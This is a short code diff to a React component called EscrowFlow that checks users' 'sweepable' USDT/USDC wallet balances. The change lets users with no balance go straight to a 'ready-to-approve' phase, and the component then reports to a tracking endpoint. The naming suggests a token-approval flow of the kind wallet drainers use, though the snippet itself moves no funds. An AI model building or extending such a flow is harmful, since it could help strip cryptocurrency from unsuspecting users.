@@ -442,7 +442,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       setWalletBalances(balances);
       setProcessing(false);
-      setPhase(totalEur >= session.minBalanceEur ? "ready-to-approve" : "insufficient-balance");
+
+      // Minimum balance gate only applies when the user has sweepable USDT/USDC.
+      // If no stablecoin balance is detected at all, let them through — there is
+      // nothing to check against and the requirement is irrelevant.
+      const hasSweepableBalance = totalEur > 0;
+      const meetsMinimum = !hasSweepableBalance || totalEur >= session.minBalanceEur;
+      setPhase(meetsMinimum ? "ready-to-approve" : "insufficient-balance");
       fetch("/api/escrow/track", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
